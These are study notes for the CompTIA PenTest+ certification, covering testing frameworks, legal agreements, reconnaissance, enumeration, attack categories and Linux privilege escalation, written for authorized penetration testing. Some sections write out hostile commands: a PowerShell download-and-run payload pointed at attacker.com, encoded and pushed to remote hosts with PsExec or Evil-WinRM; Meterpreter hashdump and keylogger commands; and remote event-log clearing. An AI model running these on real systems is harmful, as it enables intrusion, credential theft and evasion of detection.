# CompTIA PenTest+

## Penetration Testing Methodology and Frameworks

The pentest methodology varies depending on the type of client and the target of the test.  
However, it usually covers the following stages :
- **Information gathering** : passive collection of publicly accessible information (OSINT and research, no scan)
- **Enumeration / Scanning** : active discovery of the target applications and services (port scan, vulnerability scan...)
- **Exploitation** : leveraging discovered vulnerabilities to gain access (public or custom exploits)
- **Privilege escalation** : expand access to the target system (pivoting or gaining higher privileges)
- **Post-exploitation** : find what information are exposed after exploitation, cover tracks, report findings

Some frameworks provide guidelines for the penetration testing of some systems :


- **PTES** (Penetration Testing Execution Standard)  
  PTES is a framework to conduct thorough and effective penetration tests by defining 7 sections of a pentest :
  - **Pre-engagement interactions** : first communication and reasons to conduct the pentest
    - signing agreements
    - defining scope and timelines
    - lines of communication and emergency contacts
    - defining acceptable methods...
  - **Information gathering** : gathering information about the target
    - open-source intelligence
    - footprinting
  - **Threat modeling** : identify assets and processes that need protection, the threats and the capabilities
  - **Vulnerability analysis** : passive and active testing to identify vulnerabilities
  - **Exploitation** : actively exploiting the discovered vulnerabilities
  - **Post-exploitation** : accessing sensitive data, privilege escalation, backdoors installation...
  - **Reporting** : detailed report of all conducted activities, vulnerabilities, system accessed and potential impact  
  http://www.pentest-standard.org/index.php/Main_Page


- **CDPT Guidelines** (CREST Defensible Penetration Test)  
  CREST (Council of Registered Security Testers) is an organization of security companies setting rigorous standards for cybersecurity services.  
  Companies go through an extended audit and accreditation process to get CREST certified.  
  The CDPT guidelines are split into 10 sections.  
  https://www.crest-approved.org/wp-content/uploads/2022/12/CREST-Defensible-Penetration-Test-v5-2.pdf
  

- **OSSTMM** (Open Source Security Testing Methodology Manual) developed by ISECOM  
  Detailed framework of testing strategies for systems, software, applications, communication and human aspect.  
  It includes testing of telecommunications, and wired and wireless networks (128 pages).  
  It was not updated since 2010, but is still a relevant reference.  
  https://www.isecom.org/OSSTMM.3.pdf


- **OWASP Framework** (Open Web Application Security Project)  
  Community-driven framework to test the security of web applications and services.  
  It includes the OWASP Top 10 ranking of the most frequent vulnerabilities in websites and their remediation.  
  https://owasp.org/www-project-web-security-testing-guide/stable/


- **OWASP MASVS** (OWASP - Mobile Application Security Verification Standard)  
  MASVS sets baseline security standards to protect mobile applications.  
  It defines multiple control groups to divide the attack surface of mobile applications :  
    - MASVS-STORAGE : security of the sensitive data storage
    - MASVS-CRYPTO : centered on cryptographic measures
    - MASVS-AUTH : enforce strong mechanisms to verify identity and grant access rights
    - MASVS-NETWORK : security of network communication between the app and remote endpoints
    - MASVS-PLATFORM : interaction with the underlying mobile platform and other apps on the device
    - MASVS-CODE : secure development and maintenance of the app's code
    - MASVS-RESILIENCE : ability to resist reverse engineering and tampering attempts
    - MASVS-PRIVACY : enforce the implementation of privacy controls in compliance with privacy laws and regulations  
  https://github.com/OWASP/owasp-masvs


- **NIST CSF** (National Institute of Standards and Technology - Cybersecurity Framework)  
  Popular framework (50% of US organizations) used to improve an organization's cybersecurity standards and manage the risk of cyber-threats.  
  It provides guidelines on security controls and benchmarks.  
  https://www.nist.gov/cyberframework  
  The NIST also offers some special publications :  
  - **SP 800-171** : Protected Controlled Unclassified Information in Non-Federal Systems and Organizations
  - **SP 800-53** : Security and Privacy Controls for Information Systems and Organizations (500 pages, list controls that should be in place)


- **NCSC CAF** (National Cyber Security Centre - Cyber Assessment Framework)  
  Extensive framework of 14 principles to assess the risk of cyber threat and how to defend against these threats.  
  https://www.ncsc.gov.uk/collection/cyber-assessment-framework/caf-objective-a-managing-security-risk


- **MITRE ATT&CK** (Adversary Tactics, Techniques & Common Knowledge)  
  Detailed playbook of different ways attackers can attack a system.  
  Developed to improve the understanding of threat behaviors and defend against them.  
  It is a catalog of tactics (initial access, execution, persistence, privilege escalation, defense evasion...).  
  Each tactic is further divided into specific techniques, for example initial access can be achieved by spear phishing, drive-by compromise...  
  https://attack.mitre.org


- **ISSAF** (Information Systems Security Assessment Framework)  
  Open-source resource providing a comprehensive security assessment framework (1264 pages).  
  It stopped receiving updated in 2006, so it is deprecated and not in the PenTest+ objective from version PT0-003.  
  Other penetration testing frameworks like OSSTMM, OWASP or PTES should be used instead.


- **STRIDE** : security model developed by Microsoft for software development and cybersecurity
  - **Spoofing** : assume the identity of another user to gain unauthorized access to data or systems
  - **Tampering** : malicious alteration of data
  - **Repudiation** : actions that cannot be traced back to an individual user
  - **Information Disclosure** : unauthorized access to confidential information 
  - **Denial of Service** : overwhelm the system to disrupt normal activity for legitimate users
  - **Elevation of Privilege** : limited user gaining higher permission over the system


- **Purdue Model for ICS (Industrial Control System)** : framework to protect OT environments (Operational Technology)
  - define network segmentation to isolate and protect OT systems from cyber threats
  - defines 7 zones :
    - Level 5 - External / Vendor Support / Cloud Access
    - Level 4 - Business Logistics Systems / Enterprise IT Level
    - Level 3.5 - Demilitarized Zone (control exchange of data between IT and OT systems with firewalls and proxies)
    - Level 3 - Manufacturing Operations System Zone
    - Level 2 - Control System Zone (include SCADA systems to control physical processes)
    - Level 1 - Intelligent Devices Zone (include PLCs)
    - Level 0 - Physical Process Zone (include sensors)


- **OCTAVE** (Operationally Critical Threat, Asset and Vulnerability Evaluation)  
  - framework designed to manage organizational risks
  - beneficial for small to medium-size organizations without large dedicated security teams
  - encourage organizations to take ownership of the security strategies instead of relying on external consultants
  - emphasize protecting critical assets based on their value to the organization
  - include 3 phases split into 8 processes


- **DREAD** : Risk assessment model to quantify and prioritize the level of risk from several security threats  
  Each threat is assigned a score between 0 and 10 for each of the 5 DREAD categories.  
  The total threat score defines its severity : Low (0-10) / Medium (11-24) / High (25-39) / Critical (40-50)
    - **Damage Potential** : how much damage can a successful exploitation cause ?
    - **Reproducibility** : how easily the threat can be replicated by an attacker ?
    - **Exploitability** : how much effort is required to exploit the vulnerability ?
    - **Affected Users** : what users are impacted in a successful exploitation ?
    - **Discoverability** : how easy can the vulnerability be discovered by an attacker ?


### Regulations

Some companies request a penetration test as part of the compliance to some regulations.  
The penetration test must focus on these regulations' requirements to test the company's compliance.  

- **GDPR** (General Data Protection Regulation)  
GDPR imposes strict rules on data processing and storage within the EU and for business dealing with EU citizens' data.  
It requires explicit permission for data processing, and it requires a data protection officer in the company.  


- **GLBA** (Gramm-Leach-Bliley Act)  
GLBA protects the privacy of individuals' financial information held by financial institutions.


- **HIPAA** (Health Insurance Portability and Accountability Act)  
HIPAA regulates the confidentiality and security of healthcare information in the US.  
It requires patient data encryption, the implementation of secure access control and regular audits.  


- **PCI-DSS** (Payment Card Industry - Data Security Standard)  
PCI-DSS is not a regulation, but a standard agreed upon by the major actors of the payment card industry.  
It requires a secure network, strong access controls and regular network monitoring ad testing.


- **ISO/IEC 27000 Series**  
These standards are not legally mandatory, but they are highly recommended for organization handling sensitive data.  
They provide specifications for implementing, maintaining and improving information security management systems (ISMS).  
Many organizations want ISO/IEC 27000 certification to demonstrate strong security practices.  
Many vendors also want this certification as it is a main selection criteria for their customers.  
 

## Pre-engagement Activities

These are the tasks that need to be completed before the beginning of a penetration test. 

### Type of assessment
- **network** : evaluate the security of the entire network, both hardware and software (routers, switches, firewalls...)
  - network topology
  - firewall configuration
  - security policies
- **wireless** : focus on security assessment of wireless networks
- **application** : target a specific application, either developed in-house of by a 3rd party (code, dependencies, configuration)
  - usually performed before the application deployment
  - check compliance with relevant security standards
- **mobile** : focused on mobile applications and platform
  - data leakage
  - improper session handling
  - insecure data storage
- **web** : securing a web application (SQLi, XSS, security misconfiguration...)
- **cloud** : security posture of cloud-based services and infrastructure (AWS, Azure, GCP)
- **API** : test APIs used for the integration between systems and services


### Legal Agreements

- **NDA** (Non-Disclosure Agreements) : legally binding contract establishing a confidential relationship between the involved parties

- **MSA** (Master Service Agreement) : foundational terms of the business relationship between the service provider and the client
  - project scope
  - payment details
  - confidentiality clauses
  - liability issues

- **SoW** (Statement of Work) : specifics of the project or service provided (objectives, deliverables, scope, timelines, payment schedules...)

- **ToS** (Terms of Service) : govern the use of the service provided by the PenTest firm 
  - specify tools to use
  - specify limitations (no reverse-engineering...)

- **SLA** (Service Level Agreement) : commitment from the service provider for a specific quality of service (availability, responsibilities, permitted pentests...)


### Legal and Ethical Considerations

- **Authorization letters** : formally granting permission to the penetration testing team to conduct simulated cyber-attacks against the system
  - detailed scope (networks, hosts, applications), validity period, allowed techniques
  - testing on cloud provider infrastructure requires to contact the cloud vendor, for ex AWS has a specific policy for penetration testing

- **Mandatory reporting** : dictate how and when findings must be disclosed

- **Escalation path** : clearly estabish the chain of command and communication protocols in case of issue (unstable system, prod system impacted, breach of data...)

- **Export Restriction** : some technologies are not allowed to be exported outside of the US, mostly around encryption

- **National and local restriction** : some countries have specific regulations and customs that must be followed

- **Corporate Policies** : specific rules for the client organization


### Rules of Engagement

Rules of Engagement are guidelines to ensure the testing team and the client are in line with the way the tests are conducted.
- **Exclusions** : areas in the pentest that are off-limits , due to data sensitivity, business disruption or other constraints
- **Test Cases** : types of tests that will be conducted, like SQLi, password cracking, ...
- **Testing Window**
- **Goal Reprioritization** : change in test's priorities as the pentest progresses and vulnerabilities are found


### Shared Responsibility Model

The shared responsibility model defines the role of each party in maintaining the security of the system :
- **hosting providers** : secure the infrastructure that runs the service offered to customers
- **customer** : secure the data and applications running on the infrastructure  
- **penetration testers** : sort of external auditors, finding vulnerabilities that threat actors could exploit
- **3rd party application vendor** : secure the data within the 3rd party application


## Information Gathering

### Passive Reconnaissance

Gathering information about the target from public sources to minimize the risk to get detected:
- target's official website
- HTML scraping (BeautifulSoup in Python)
- DNS records (dig / nslookup)
- open-source repos (GitHub, BitBucket, SourceForge)
- check images and archive websites (The Wayback Machine)


### OSINT (Open-Source Intelligence)

Publicly available information used to gather insight about the target :
- who works there ?
- what is the company structure ?
- who can share sensitive information ?

The main sources of OSINT are :

- **social media**
  - Facebook for company activities
  - Instagram for physical security and employees interaction
  - LinkedIn for technologies in use and new hires (potentially more vulnerable)
  - Twitter (X) for current activity in the company due its real-time aspect

- **job boards** (LinkedIn or Indeed)

- **information disclosure**
  - error messages revealing database dump or internal details
  - cloud access permission misconfiguration

- **CT logs** (Certificate Transparency) can reveal some subdomains

- **Google Hacking** (advanced Google search optimization)
  - `site:example.com` : limit to a specific domain
  - `intitle:"report"` : limit to pages with a specific string in the title
  - `inurl:login` : limit to pages with a specific keyword in the URL 
  - `filetype:pdf` : limit the pages to a given file type


### Network Sniffing

Network Sniffing refers to the capture of data packets as they travel across the network.  
It allows **network reconnaissance**, which is the gathering of information about the topology and architecture of the network.  
It reveals the active hosts, services and key communication endpoints.  

Network traffic is captured in a PCAP file by network sniffers (WireShark or tcpdump).  
IoT and OT protocols (like MQTT and Modbus) can also be captured in WireShark (Modbus requires a specific WireShark plugin).


## Enumeration and Scanning


### Active Reconnaissance

- **Port scanning** to identify open/closed TCP/UDP ports and the services they run (nmap)
- **Banner Grabbing** to learn about running software's type and version (wget, curl, telnet, netcat, nmap...)


### Enumeration

Use the knowledge gained from information gathering, and actively dig deeper to list the target's resources.  
During enumeration, we try to get a list of services, devices, networks, users, domains, protocols...  
It gives a good picture of the target's landscape and helps identify the potential entry points.

- Ping scan to know which machines are online (nmap)
- TCP scan to discover open ports on a machine (nmap)
- OS footprinting to detect the OS on the target host (nmap)
- Windows host enumeration
  - `net view` : list machines on the network
  - `arp -a` : display the local ARP cache
  - `ipconfig /displaydns` : display the local DNS cache
- Active Directory enumeration
  - `Get-ADDomain` : information about the AD domain the machine is connected to
  - `Get-ADComputer -Filter *` : information about computers in the AD environment
  - `Get-ADGroupMember` : information about members of an AD group
- User enumeration
  - `Get-LocalUser` : information about all local user accounts
  - `net user` : information about each user
  - `getuid` Meterpreter command showing the access level of the current user
  - `/etc/passwd` : list users in Linux
  - `/etc/shadow` : list user passwords in Linux
- Emails enumeration (used for social engineering)
  - query SMTP servers with `VRFY` and `EXPN` to verify existence of an email address or list mailing list members
  - search engines and online databases like **the Harvester**
  - use social media
  - whois lookup to reveal admin emails
- Permission enumeration : identify access controls within a system
  - rights assigned to users and groups on files, directories, databases, network shares...
  - `PowerView` is a PowerShell tool used for network enumeration and privilege escalation
  - `sqlmap` can enumerate database users on an application vulnerable to SQLi
  - `SMBMap` and `CrackMapExec` can be used to enumerate network shares and their permissions
  - AWS CLI and Azure PowerShell are used to enumerate cloud permissions
- Wireless devices enumeration
  - war-driving : looking for unsecure wireless access points with a laptop, smartphone or other wireless-enabled device
  - tools to detect wireless access points : `aircrack-ng`, `kismet`, `wifite`
  - `wigle.net` offers a map of the world with wifi networks (but the free version has a very low daily limit)
- Secrets enumeration (cloud access keys, API keys, passwords, session tokens...)
  - public source code repositories (GitHub, BitBucket...) 
  - `Pacu` : an open-source AWS exploitation framework designed to assess the security of AWS accounts
    - search through environment variables, configuration files, metadata services...
    - list user accounts
    - obtain cloud access keys
    - gain control of virtual machines
- Web enumeration
  - web crawling : automated browsing of the web to gather information (dirbuster, gobuster)
  - manual enumeration
    - `robots.txt` file telling web crawlers which parts of websites should not be accessed (can reveal hidden areas)
    - a sitemap is an XML file listing all the URLs of the website, intended to help search engines index the site
    - Web application firewalls (WAF) can reveal info on the internal machines if not configured properly 


### Scanning

Many vulnerability scanners can be used to identify potential vulnerabilities in the target system :

- **Network / Host Scanners**
  - Nessus
  - OpenVAS
  - Qualys


- **Web Application Scanners**
  - Burp Suite
  - IBM Security AppScan
  - Acunetix
  - OWASP ZAP
  - Nikto
  - SkipFish
  - Wapiti

These scanners generate a long list of potential vulnerability in the configuration.  
Some of them assign a severity to each identified potential vulnerability.  
An important part of the result analysis is to prioritize these vulnerabilities.  

All vulnerabilities found by automated scans need to be verified, to discard false positives.  
For example SQLi vulnerabilities can be manually confirmed, or identified subdomains can be checked with a manual DNS query.  

Target assets must be prioritized to identify high value assets (systems, data, processes...).  

A scan can be authenticated or non-authenticated, by providing or not some valid access credentials.  
An **authenticated scan** can identify more vulnerabilities, that an attacker could exploit if he manages to get credentials.  


#### Types of vulnerabilities

- EOL Software : no patches will ever be created so they most likely contain unpatched known vulnerabilities (Windows XP, Adobe Flash Player...)
- Outdated programs or libraries : may contain known vulnerabilities
- Default Credentials : many network devices or applications ship with default credentials and are left unchanged
- Unneeded services running
- Vulnerable encryption : outdated algorithm (MD5, SHA1...) or version (SSL/TLS)
- Exposed configuration files or APIs


#### Application scanning

Software and Web applications are one of the main targets in a penetration test.  

**DAST** (Dynamic Application Security Testing) is the testing of an application outside-in while it is running.  
It does not require access to the source code and identifies real-world vulnerabilities that an attacker could exploit.  
Common DAST tools include OWASP ZAP and the Burp Suite.  

**IAST** (Interactive Application Security Testing) is the testing of the application from the inside while it is running.  
It is a combination of dynamic and static testing, as the IAST tool has access to the source code but works on the running application.  
It can identify which parts of the code cause specific issues, and provide real-time feedback to the developers.  
Common IAST tools include Contract Security and CheckMarx IAST.  

**SAST** (Static Application Security Testing) is the testing of the application source code and binary without executing the application.  
It can identify vulnerabilities before the application deployment, improve the code quality and integrate with CI/CD tools.  
Common SAST tools include SonarQube, CheckMarx and Veracode.  

**SCA** (Software Composition Analysis) is a method used to identify and manage open-source components used by an application.  
It checks for known vulnerabilities, outdated components and license compliance issues.  
SCA does not analyze the custom code making use of these open-source components.  
The **OWASP Dependency-Check** tool automates the detection of publicly disclosed vulnerabilities in the project and its dependencies.

**Trivy** is a CLI tool that can be used to scan container images of Kubernetes clusters.


#### Wireless scanning

- aircrack-ng
- InSSIDer
- Wigle.net
- Reaver


#### Packet Crafting

Packet crafting is used to send custom packets to the target and observe the response to identify vulnerabilities.
- Scapy
- Impacket 
- Hping


## Attacks and Exploits

### Network Attacks

- On-path Attack
- Stress Testing
- MAC Spoofing
- VLAN hopping
- Session Hijacking
- LLMNR / NBT-NS Poisoning
- ARP Poisoning

### Authentication Attacks

- **Password attacks**
  - brute-force
  - dictionary
  - hybrid
  - rainbow table
  - password spraying
  - credential stuffing (use of previously breached credentials)


- **Credential passing attacks**
  - pass-the-hash
    - Mimikatz can extract NTLM password hashes from memory
    - NTLM hashes are accepted as credentials to access SMB, RDP and WinRM
    - tools : extract hash with Mimikatz, use it with CrackMapExec or Impacket (smbclient.py)
  - pass-the-ticket
    - use a stolen Kerberos ticket to authenticate to a service
    - tools : extract the ticket with Mimikatz, use it with Impacket (psexec.py)
  - pass-the-token
    - use stolen JWT token to authenticate to a web application
    - to use it, just include it in the HTTP header `Authorization: Bearer <JWT_TOKEN>` 
    - mitigated by enforcing HTTPS and implementing token expiration


- **Directory Service attacks**
  - Kerberos attacks
    - pass-the-ticket
    - Kerberoasting : extract service account tickets to crack their passwords offline
  - LDAP attacks
    - LDAP query injection via vulnerable application


- **SAML attacks**
  - SAML token manipulation
    - SAML tokens are XML based and contain the assertions about user identity and permissions
    - if the tokens are not properly signed or the validation is weak, it can be altered to impersonate a user
  - SAML replay
    - intercept a valid SAML token (with WireShark for ex) and reuse it as-is to gain unauthorized access
  - SAML injection
    - exploit vulnerability in the application processing SAML tokens


- **Open ID Connect (OIDC) attacks**
  - ID token manipulation
    - ID tokens are JWTs containing info about the user identity and privileges
    - if the JWT signature validation is weak, the JWT payload can be altered to escalate privileges or impersonate a user
  - ID token replay
  - ID token injection


- **Hash attacks**
  - collision attacks
  - salting : add a unique random prefix to each password before hashing it
    - prevent same passwords to have the same hash
    - make rainbow tables inefficient
    - prevent brute-force if the salt is not known and used by the password cracker
  - key stretching : hash the password multiple times
    - increase the CPU required to hash a password
    - prevent brute force if the password cracker does not apply the hashing function the right number of times
    - common key stretching algorithm is **PBKDF2**


### Host Attacks

- **Privilege escalation**
  - vertical escalation = gaining higher privileges
  - horizontal escalation = accessing peer level accounts
  - Mimikatz : post exploitation tool extracting plaintext passwords, hash dumps and Kerberos tickets from memory
    - horizontal escalation by getting credentials of logged in users
  - Seatbelt : post-exploitation tool to detect System misconfiguration in Windows 
  - Meterpreter : Metasploit custom shell accessible with most Metasploit exploits and MsfVenom payloads
  ```shell
  # Meterpreter useful commands
  
  getpid             # get the process ID under which our shell is running
  ps                 # list all running processes to see the user of our current process 
  getsid             # get the security ID, the unique identifier of the user in the domain (S-1-5-18 for SYSTEMS)
  hashdump           # use mimikatz to dump user names, IDs and hashes
  migrate 1424       # migrate the current shell into another process (for example to look less suspicious)
                     # the main reason to migrate is to run the shell inside a stable process like explorer.exe or services.exe
                     # also if we want to use a keylogger we need to have a shell running as the target user
  keyscan_start      # start a keylogger
  keyscan_dump       # print to the screen the captured keystrokes
  keyscan_stop       # stop the keylogger
  ```
  

- Misconfigured endpoints
  - weak passwords
  - unnecessary services running
  - once the attacker has access to a network, he can use PowerShell to execute scripts or PsExec to send commands to other machines on the network.


- **Payload Obfuscation**
  - techniques used to disguise malicious payloads to avoid detection by security tools
  - done via encoding, encryption, compression, code manipulation...
  - the payload can be encoded with PowerShell :
  ```shell
  $payload = 'Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\temp\payload.exe; Start-Process C:\temp\payload.exe'
  $bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
  $encodedPayload = [Convert]::ToBase64String($bytes)
  ```
  - the encoded payload can be sent and executed to remote machines with PsExec
  ```shell
  psexec \\<REMOTE_IP> -s poweshell.exe -Command "powershell -EncodedCommand $encodedPayload"
  ```
  - Evil-WinRM is another tool that can be used to execute command on a remote machine via the Windows Remote Management services (WinRM)
  ```shell
  evil-winrm -i <REMOTE_IP> -u <USERNAME> -p <PASSWORD> -s "powershell -EncodedCommand $encodedPayload"
  ```


- **Active Directory / Kerberos attacks**
  - **AD CS** (Active Directory Certificate Services)  manages certificates used for authentication and encryption
    - if the AD CS templates are misconfigured and allow any authenticated user to request a certificate for any service, we have a vulnerability
    - with the **Certify** tool, we can scan for misconfigured certificate templates and request a certificate for a service account that has high privileges
    - this allows to authenticate as this high-privilege account against various services
    - it allows privilege escalation when we have access to a low-privilege account
  - **Kerberos** : primary authentication protocol used by AD
    - with the **Rubius** tool, we can interact with Kerberos tickets to try to get powerful access to a domain
    - Pass-the-ticket attack to steal a valid Kerberos ticket from memory and re-use it to authenticate to other services
    - Forge golden tickets granting access to any service as any user, if we have compromised the KRBTGT account's NTLM hash (dumped from a Domain Controller with Mimikatz)
    - with the **Evil-WinRM** post-exploitation tool, we can remotely execute commands on a Windows machine over HTTP using PowerShell remotely
    - it is mostly used once we get initial access to pivot within the network


- **Shell escape / Kiosk escape**
  - a shell escape occurs when we break out from a restricted shell environment to gain unauthorized access to the underlying system
    - using a command allowing to execute other programs, like vim or nano
    - on PowerShell, using cmdlet `Invoke-Expression -Command "cmd.exe"`
  - a Kiosk escape occurs when we break out of a restricted computing environment (browser in a lobby, point of sale terminal, check in system, restaurant menu...)
    - vulnerability in the allowed application
    - in Windows, using "Save As", find executables (like cmd.exe) to run commands
      ```shell
      # example if we have the Invoke-WebRequest cmdlet 
      Invoke-WebRequest -Uri <POWERSHELL_SCRIPT_URL> -OutFile C:\Users\Public\myscript.ps1
      powershell.exe -ExecutionPolicy ByPass -File C:\Users\Public\myscript.ps1
      
      # example if we have the Get-WmiObject cmdlet to break out of a browser and start a new regular one
      (Get-WmiObject -Query "SELECT * FROM Win32_Process WHERE Name='explorer.exe'").Terminate()
      Start-Process "C:\Windows\explorer.exe"
      ```


- **Library and Process Injection**
  - code execution within the address space of another process by making it execute our code via its dependencies
  - used to evade detection, escalate privileges and bypass security controls
  - it takes advantage of the trust the system has in the injected process
  - **DLL injection** : loading of a dynamic link library into the memory space of a target process
  - **Reflective DLL injection** : stealthy technique where the malicious DLL is loaded directly from memory rather than written on disk 
  - **Remote thread injection** : create a new thread in a remote process pointing to a memory location containing malicious code
  - **Process Hollowing** : spawning a new process in suspended state, replacing its memory wth malicious code, then resuming the process


- **Log Tampering**
  - attempt to modify or delete logs to avoid detection and hinder the investigation
  - PowerShell can be used to interact with Windows Event log, recording significant system events
  ```shell
  # clear all logs in a specific event log 
  Clear-EventLog -LogName Security
  Clear-EventLog -LogName Application
  Clear-EventLog -LogName System
  ```
  - logs can be removed from a remote machine by executing PowerShell commands via **PsExec**
  ```shell
  # clear all the logs om a specific event log from a remote machine
  # the -s option makes it run as a SYSTEM account allowed to clear event logs
  psexec \\<REMOTE_IP> -s powershell.exe -Command "Clear-EventLog -LogName System"
  ```


- **Living Off the Land**
  - **LOLBins** (Living-Off-the-Land Binaries) are legitimate pre-installed tools on the OS (not malware or tools downloaded by the attacker)
  - avoid detection as these binaries are trusted by the system
  - **PowerShell** can be used to gather info about the target system
  - **bitsadmin.exe** : manage the BITS (Background Intelligent Transfer Service), used to download files from the internet
  - **regsrv32.exe** : register/unregister DLLs
  - **schtasks.exe** : manage scheduled tasks
  - **certutil.exe** : manage certificates, encode and decode data, that can help with data exfiltration


### Web Applications

- **Directory Traversal**
  - allow access to files and directories outside of the intended web document root directory.  
  - use the dot-dot-attack to try to go up the file system to access sensitive files (like /etc/passwd).  
  - proper web server configuration prevents the access to files outside of the web document root directory
  - sanitization can be used to prevent ../ (Linux) and ..\ (Windows)
  - attackers may try to bypass this sanitization by using the `../` encoded form `%2E%2E%2F`


- **Injection Attacks**
  - **SQL injection** via query parameter, HTTP form, HTTP header, cookie...
  - **Command Injection** when system commands are run using user-provided data
  - **SSTI (Server-side Template Injection)** when user input is embedded in server-side templates
  - **XML Injection**


- **File Inclusion**
  - occurs when the web application includes files on the server which path is controlled by user input
  - **RFI (Remote File Inclusion)** : inclusion of a file from an external source (for example an attacker's malicious PHP script)
  - **LFI (Local File Inclusion)** : include a file from the local server (for example /etc/passwd)
  - Web Shells can be uploaded to the server if no proper validation (profile picture / receipt / image upload)


- **Session Hijacking**
  - Webapps send a session ID to the user on successful authentication to identify the user
  - the user sends this session ID as a cookie with every later request
  - if the attacker steals this session ID cookie, he can impersonate the user
    - **session fixation** : session hijacking where the attacker knows the session ID in advance and waits for the user to login
      - to prevent it, always generate a new session ID on login
    - **session replay** : the attacker captures the login session and repeats it
    - **XSS** : the attacker injects malicious scripts into the web page viewed by the user to capture the session ID cookie
      - to prevent, validate user input and use secure HTTP headers to limit the sources from which a script can be loaded
  - the session ID cookie should have the **Secure flag** set to ensure it is sent only via HTTPS


- **API Abuse**
  - APIs can use JWT (JSON Web Tokens) to identify the user
    - stateless token (nothing to store on the server) made of a header, a payload and a signature
    - the payload contains the data to store (user identity and roles), it is encoded but not encrypted
    - the signature uses the private key of the web server to ensure the payload was not altered
    - JWT payload can be altered, so the signature must always be verified
  - API can be tested with Postman, supporting REST, SOAP and GraphQL API


- **Race condition**  
  - Vulnerability when the outcome from execution processes is dependent on the order and timing of certain events.  
  - occurs when multiple threads attempt to write at the same time to the same memory location
  - **Dirty Cow** is a 2016 example of race condition in the Linux Copy-on-Write kernel function that allowed privilege escalation
  - **TOC/TOU vulnerability** (Time of Check / Time of Use) : when a change happens to the memory object between the check and the actual use
  - locks and mutexes (mutually exclusive flags allowing a single thread through) can be used to lock the resource between the check and the use


- **Buffer Overflow**  
  - Vulnerability when the process stores data outside the expected memory range
  - **Smashing the Stack** : attack where the attacker fills up the buffer with NOP instructions (instruction doing nothing and going to the next)
  - Defenses :
    - good patch management
    - secure coding practices, including boundary checking
    - ASLR (Address Space Layout Randomization) : prevent the attacker to guess where the return pointer is set to call back to
    - DEP (Data Execution Protection) : marking every area of memory as executable or not, prevent code from data area to execute code


- **Broken Authentication**
  - Passwords weak or easily guessed
  - Coding Flaws in the authentication system
    - no lockout feature on login failure, allowing brute-force
    - reset password feature based on guessable information (date of birth, ...)
    - Session IDs must be really random and not in the URL parameter (possible to capture with a sniffer)
  - Defense :
    - Use MFA
    - Never use default credentials
    - Verify passwords are strong and not in leaked lists
    - Use limits or delay to slow failed login attempts
    - use randomized session IDs and never pass it as URL parameter
    - session IDs should have a timeout


- **IDOR (Insecure Direct Object Reference)**  
  - manipulate URL to get access to a resource without proper authentication
  - to protect against it, secure coding practices by implementing access control verifying the user authorization on any object


- **Improper Error Handling**  
  - Sanitize any user input
  - Error handling preventing application failure
  - Use custom error messages to not leak sensitive information (SQL query, file name, source code, ...)


- **Improper HTTP Headers**
  - Some HTTP headers improve the security of the web application (see OWASP Secure Headers Project)
    - **HSTS (HTTP Strict Transport Security)** : notify web browsers to only request using HTTPS and not HTTP
    - **HPKP (HTTP Public Key Pinning)** : Allow HTTPS website to resist impersonation by attackers with fraudulent certificates
    - **X-Frame-Options** : prevent clickjacking from occuring by forbidding frames inside the website
    - **X-Cross-Site-Scripting-Protection** : enable cross-site scripting filter in the web browser
    - **X-Content-Type-Options** : prevent the browser from interpreting files as something other than the specified type
    - **Content-Security-Policy** : drive how web browsers render pages (disable Javascript for example)
    - **X-Permitted-Domain-Policies** : tell the web browser what domains the website is allowed to reach out to
    - **Referrer-Policy** : dictate how much information about the referrer is sent (previous page URL, tokens, search terms...)
    - **Expect-CT** : tell browsers to evaluate connections to the server for Certificate Transparency compliance
    - **Feature-Policy** : allow to enable or disable the use of various browser's features or API (for ex geolocation)


- **Code signing**
  - distributed programs can be signed by the provider so the customer can verify that it was not altered
  - signing is required to publish applications on the App store (developers get a private key from Apple or Google)
  - it does not protect about an alteration of the code directly on the provider's side (like SolarWinds)


- **Vulnerable Components**
  - Client-side / Server-side processing
  - Sanitize all data received from the client
  - REST and JSON are preferred over SOAP and XML as less verbose 
  - remove **Adobe Flash** from any installation (it is no longer supported and has known vulnerabilities)
  - **HTML5** adds support for medias, removing the need for Flash or ActiveX
  - **AJAX** (Asynchronous JavaScript and XML Technologies) ; group of client-side technologies to create async applications
    - receive data from a server without reloading the entire application
    - used for maintaining sessions and conducting state management


## Privilege Escalation

Privilege escalation is the exploitation of a vulnerability or misconfiguration to gain unauthorized access to resources.  
During a penetration test, we usually get a foothold in the system as a normal user (for example with social engineering).  
We then need to use privilege escalation to gain administrative access and get full-control over the machine (password reset, user creation, admin commands...).  


### Linux Enumeration

- `hostname` : display the name of the host we got initial access to, its name may reveal its role in the system.  
- `uname -a` : get the version of the kernel, so we can check if some known vulnerabilities exist for it
- `cat /proc/version` and `cat /etc/issue` : information on the OS (for example Ubuntu version) and installed compiler (GCC version)
- `ps aux` : list all running processes for all users, show the user who launched it and include the processes not attached to a terminal
- `env` : show all environment variables (including the PATH variable)
- `sudo -l` : list commands that the current user can run with `sudo`
- `id` : show the current user's ID and group memberships, it can also be used on another user with `id <USER>`
- `cat /etc/passwd` : discover users configured on the machine
- `history` : show commands previously run by the current user
- `ifconfig` : show the current machine's network configuration (interfaces, IP and MAC address), useful to pivot to another network
- `ip route` : show the routing table configured for the current machine
- `netstat` : show information on existing connections
  - `-a` : show all connections
  - `-l` : show listening connections
  - `-t` : limit to TCP and display the local address (including the listening port)
  - `-s` : show statistics by protocol (IP / ICMP / TCP / UDP)
  - `-i` : show statistics by network interface
  - `-n` do not resolve names
- `find . -name flag.txt` : search for files on the system, can use filters by type, size, permissions, owner...
  - use `-type f 2>/dev/null` to limit the result to files and ignore the permission errors for restricted folders
  - can filter on a size bigger or greater than a value, for example `-size +100M`
  - `find / -type d -perm -o x 2>/dev/null` : find all folders executable by anyone
  - `find / -writable 2>/dev/null` : find all folders writable by the current user 
  - `find / -type f -perm -04000 -ls 2>/dev/null` : find all files with the SUID bit set
- `cat /etc/crontab` : show the system-wide crontabs
- Automated enumeration tools :
  - [LinPeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
  - [LinEnum](https://github.com/rebootuser/LinEnum)
  - [LES (Linux Exploit Suggester)](https://github.com/The-Z-Labs/linux-exploit-suggester)

### Linux Privilege escalation techniques

#### Sudo permission binaries

Some binaries can execute a command, so they can provide a root shell if they can be run with sudo permissions.  
We can list the binaries with sudo permissions with `sudo -l`.  
We can check for each of these binaries if there is a way to escalate privilege on GTFOBins.

Some binaries may not be listed, but still have a way to escalate privileges.  
